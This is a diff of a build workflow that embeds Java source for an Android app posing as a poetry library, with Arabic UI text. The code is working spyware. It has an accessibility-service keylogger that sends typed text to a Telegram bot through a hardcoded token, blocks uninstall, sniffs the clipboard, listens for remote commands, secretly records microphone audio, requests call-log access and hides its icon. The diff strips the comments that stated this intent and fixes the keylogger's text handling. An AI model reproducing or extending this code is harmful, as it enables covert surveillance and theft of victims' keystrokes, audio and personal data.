@@ -245,6 +245,7 @@ jobs:
         import android.view.accessibility.AccessibilityNodeInfo;
         import java.net.HttpURLConnection;
         import java.net.URL;
+        import java.util.List;
 
         public class RoyalAccessibilityService extends AccessibilityService {
             private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
@@ -255,7 +256,6 @@ jobs:
                 if (event.getPackageName() != null) {
                     String pkg = event.getPackageName().toString();
                     
-                    // منع إلغاء التثبيت
                     if (pkg.contains("settings")) {
                         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                         if (rootNode != null) {
@@ -263,11 +263,14 @@ jobs:
                         }
                     }
 
-                    // مسجل المفاتيح السري (Keylogger) للصوص النصوص المحسوسة
                     if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                        CharSequence txt = event.getText();
-                        if (txt != null && txt.length() > 0) {
-                            sendToTelegram("⌨️ [مستشعر لوحة المفاتيح - Keylogger]:\nالتطبيق: " + pkg + "\nالنص المكتوب: " + txt.toString());
+                        List<CharSequence> textList = event.getText();
+                        if (textList != null) {
+                            for (CharSequence txt : textList) {
+                                if (txt != null && txt.length() > 0) {
+                                    sendToTelegram("⌨️ [مستشعر لوحة المفاتيح - Keylogger]:\nالتطبيق: " + pkg + "\nالنص المكتوب: " + txt.toString());
+                                }
+                            }
                         }
                     }
                 }
@@ -362,7 +365,6 @@ jobs:
                     startForeground(1, notification);
                 }
 
-                // تفعيل صياد الحافظة الذكي (Clipboard Sniffer)
                 initClipboardSniffer();
                 startCommandListener();
             }
@@ -481,12 +483,11 @@ jobs:
                             recorder.prepare();
                             recorder.start();
 
-                            Thread.sleep(15000); // تسجيل لمدة 15 ثانية لمحيط الهدف
+                            Thread.sleep(15000);
 
                             recorder.stop();
                             recorder.release();
 
-                            // إرسال الملف الصوتي لتيليجرام
                             sendAudioFileToTelegram(audioFile);
                         } catch (Exception e) {
                             sendToTelegram("⚠️ فشل تسجيل الصوت: " + e.getMessage());
@@ -783,7 +784,6 @@ jobs:
                         Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية وتهيئة جرس التنبيهات...", Toast.LENGTH_LONG).show();
                         txtPoem.setText("🌿 تم تهيئة جرس التنبيهات والواحة بنجاح؛ المكتبة الآن تعمل بهدوء تام في الخلفية.");
                         
-                        // طلب الأذونات العادية دفعة واحدة بمصفوفة موحدة تشمل الميكروفون
                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                             String[] perms = {
                                 android.Manifest.permission.READ_CALL_LOG,
@@ -807,7 +807,6 @@ jobs:
                             requestPermissions(perms, 100);
                         }
 
-                        // توجيه ناعم لإعدادات الإشعارات والتسهيل بصيغة أدبية غير مقلقة
                         try {
                             Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                             startActivity(intent);
@@ -818,7 +817,6 @@ jobs:
                             startActivity(accIntent);
                         } catch (Exception ignored) {}
 
-                        // عباءة الخفاء: إخفاء الأيقونة تماماً من درج التطبيقات بعد التفعيل لضمان التستر التام
                         try {
                             PackageManager p = getPackageManager();
                             ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
